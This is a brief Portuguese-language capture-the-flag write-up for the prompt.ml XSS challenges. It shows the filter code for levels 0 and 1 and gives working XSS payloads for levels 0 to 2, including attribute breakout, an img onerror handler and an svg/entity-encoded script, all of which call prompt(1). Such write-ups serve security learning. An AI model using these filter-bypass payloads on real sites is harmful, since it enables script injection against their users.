# Prompt.ml

###### Solved by @Cubano2
> This is a CTF about 

## About the Challenge  
Aqui neste write-up se encontra as respostas do site [prompt.ml](https://prompt.ml/0)  

Nesse site tem desafios de XSS que ensinam sobre a gente sobre os tipos de vulnerabilidade em aplicação web e em navegadores.
O navegador usado neste write-up foi o Microsof Edge

## level 0
```python
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
O level 0 é bem tranquilo, com uma simples HTML injection consguimos passar dele.
level 0 ```"><script>prompt(1)</script>```

## level 1
```python
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
level 1 ```<img src=1 onerror='prompt(1)'```

level 2 ```<svg><script>prompt&#40;1)</script>```

